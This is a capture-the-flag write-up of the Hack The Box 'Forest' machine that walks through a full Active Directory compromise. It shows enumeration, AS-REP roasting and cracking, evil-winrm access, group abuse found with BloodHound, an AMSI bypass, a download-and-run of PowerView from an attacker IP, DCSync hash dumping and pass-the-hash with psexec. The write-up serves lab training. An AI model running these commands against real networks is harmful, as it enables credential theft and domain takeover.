# Port enum 
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-12 12:14 CET
Nmap scan report for 10.10.10.161
Host is up (0.25s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-12 11:21:16Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6417/tcp  closed faxcomservice
9389/tcp  open   mc-nmf        .NET Message Framing
18126/tcp closed unknown
19749/tcp closed unknown
19938/tcp closed unknown
30611/tcp closed unknown
33708/tcp closed unknown
35470/tcp closed unknown
41785/tcp closed unknown
42375/tcp closed unknown
43152/tcp closed unknown
45303/tcp closed unknown
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49440/tcp closed unknown
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49671/tcp open   msrpc         Microsoft Windows RPC
49676/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc         Microsoft Windows RPC
49684/tcp open   msrpc         Microsoft Windows RPC
49706/tcp open   msrpc         Microsoft Windows RPC
50908/tcp closed unknown
54125/tcp closed unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=11/12%Time=67333897%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m50s, deviation: 4h37m10s, median: 6m48s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-11-12T03:23:45-08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-12T11:23:41
|_  start_date: 2024-11-12T11:17:22

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 291.21 seconds

```

## Interesting ports
```
Http -> 5985, 47001
samba -> 139, 445
```

Let's dig a little bit into LDAP. Since we know the domain is `htb.local` due to the output of nmap, we can try to anonymously (`-x` option) enumerate all the things referred to this domain (`-b "dc=htb,dc=local`) and the port to be checked is the `-p 389`
```
ldapsearch -h $(cat ip) -p 389 -x -b "dc=htb,dc=local"
```

We can also check for some of the objects created in ldap with #windapsearch to check if there is any interesting service or whatever:
```
./windapsearch.py --dc-ip 10.10.10.161:389 --custom "objectClass=*"
```
There are 301 objects created, and there's one service which may be interesting: `svc-alfresco`. Let's try to get some user. In the docs we check that `svc-alfresco` user does not require Kerberos preauthentication, so we can ask for a Ticket Grant Ticket (TGT):
```
./GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass

$krb5asrep$23$svc-alfresco@HTB.LOCAL:02f6c463d480cafb9f961ade72c722cc$6e8a6b1d8f4e0543f528e83ffeeaa0a64e110d5585fd7d62e17a644cdf332c1419bc2e25e3cc24a38ead97de7bce98e4ef88fc48583dc1c8aa6b6ca3d96af5f07983f1013763f8eff3121e30e7952e65eecaaaa17ff046d337c7ed0f5e2a154266cda58e1e0fe84c30f7ad90915332d262e978d1e7af0d61f7896b20aea5c5c952cb2c2eb75a28b4a5fd756410d10ada80ae63a4dc473b2afb97e20968c88d62d5ab4cf474f2f4d7d1b980e30aa5c5bca3c3e7fff7a52414c6ce42073c436733249761fa6211a00c82075adc0ba17c19d2ee98adb56068ef1f94f6f022424c9e9a4b9465f66c
```

Once again with a [hash-identifier online tool](https://www.dcode.fr/hash-identifier) we can check the hash type to run the proper hashcat mode: `Kerberos 5 AS-REP etype 23` :
```
hashcat -h | grep "Kerberos 5 AS-REP etype 23"
  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols

hashcat -m 18200 -a 0 svc-alfresco.tgt $SECLIST/../rockyou.txt

pass -> s3rvice
```

Since we have some credentials and we have observed an HTTP server on port 5895, we can try using evil-winrm to retrieve a reverse shell:
```
evil-winrm --ip $(cat ip) --user svc-alfresco --password s3rvice
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```
And we are in! So we can already dump the user.txt flag:
```
605da...
```

We got stuck and nothing interesting is found with winpeas. So it looks like it's turn to check [BloodHound](https://github.com/SpecterOps/BloodHound) tool:
```
# First create an http server to grab the file from our machine to the host machine, and then you can run the collector and output the information into a zip file
./sharphound.exe -c All -d htb.local --zipfilename loot.zip
```

To retrieve the generated zip, I tried using a python server allowing to post files through the /upload endpoint, but it looks like it's not working.

Let's try to identify if there is any SMB folder I can take advantage of:
#nmap-smb  
```
nmap --script smb-enum-shares.nse $(cat ip)

Host script results:
| smb-enum-shares:
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.161\ADMIN$:
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.161\C$:
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.161\IPC$:
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: READ
|   \\10.10.10.161\NETLOGON:
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: <none>
```

We can access the NETLOGON folder with the svc-alfresco credentials, so let's search for the default path and try to copy there the loot.zip

```
C:/Users/svc-alfresco/Desktop/20241112095310_loot.zip
C:\Users\svc-alfresco\Desktop\20241112095310_loot.zip
```

After stopping and thinking, the evil-winrm itself is able to download files, so let's go:
![[Pasted image 20241112200438.png]]

The main key here is to be able to find a path so that we can add our user to the domain as a privileged users. So, we select our machine (SVC-ALFRESCO) as an owned machine and we then go to the cypher tab and search for the `shortest paths to high value targets`
After some inspection we find out that the `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL` group has permissions to `WriteDacl`. So we find if we are in any group that also belongs to the ExchangeWindowsPermissions group. That group is ACCOUNT `OPERATORS@LOCAL.HTB`.

Now it's time to grant this accesses:
```
net user mcflanagan testp4ss! /add /domain

net group "Exchange Windows Permissions" mcflanagan /add

# Tried 
net localgroup "Account Operators" mcflanagan /add
# But access denied, so searching for a group that is contained on Privilegeed It Accounts we find both the tried and the new target group
net localgroup "REMOTE MANAGEMENT USERS" mcflanagan /add
```

Then we have to bypass the 4MSI which can be done with the evil-winrm itself, and then you can download the PowerView.ps1

We will then need to give the new user the rights for DCSync:
```
Bypass-4MSI

iex(new-object net.webclient).downloadstring('http://10.10.16.6:80/powerview.ps1')


$pass = convertto-securestring 'testp4ss!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb.local\mcflanagan' , $pass)
Add-ObjectACL -PrincipalIdentity mcflanagan -Credential $cred -Rights DCSync

```

Then it looks like the next step is to perform a DCSync attack.
By using the impacket tool secretsdump.py we can extract a lot of sensitive data as administrator hash:
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

Once we have an NTLM hash for adminsitrator, using the psexec tool from impacket we can execute directly commands just with the hash.

```
psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

```

And thus finally we obtain the root flag 
```
8063...
```